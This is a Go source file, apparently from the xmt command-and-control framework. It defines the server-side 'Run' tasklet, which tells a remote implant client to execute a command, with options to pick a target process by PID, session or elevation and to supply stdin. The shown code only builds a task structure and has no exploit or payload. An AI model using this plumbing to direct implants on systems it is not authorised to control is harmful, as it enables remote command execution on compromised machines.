//go:build !implant

// Copyright (C) 2020 - 2022 iDigitalFlame
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.
//

package task

import (
	"io"

	"github.com/iDigitalFlame/xmt/cmd"
)

// Run will create a Tasklet that will instruct the client to run a command.
// This command will be parsed using the 'cmd.Split' function.
//
// The Filter attribute will attempt to set the target that runs the Process.
// If none are specified, the Process will be ran under the client process.
//
// The response to this task will return the PID, ExitCode and Stdout/Stderr
// data.
//
// C2 Details:
//  ID: TvExecute
//
//  Input:
//      Process struct {
//          []string        // Args
//          string          // Dir
//          []string        // Environment
//          uint32          // Flags
//          bool            // Wait
//          int64           // Timeout
//          Filter struct { // Filter
//              bool        // Filter Status
//              uint32      // PID
//              bool        // Fallback
//              uint8       // Session
//              uint8       // Elevated
//              []string    // Exclude
//              []string    // Include
//          }
//          []byte          // Stdin Data
//      }
//  Output:
//      uint32              // PID
//      int32               // Exit Code
//      []byte              // Output (Stdout and Stderr)
func Run(c string) Process {
	return Process{Args: cmd.Split(c), Wait: true}
}

// SetStdin wil attempt to read all the data from the supplied reader to fill
// the Stdin byte array for this Process struct.
//
// This function will return an error if any errors occurs during reading.
func (p *Process) SetStdin(r io.Reader) error {
	var err error
	p.Stdin, err = io.ReadAll(r)
	return err
}
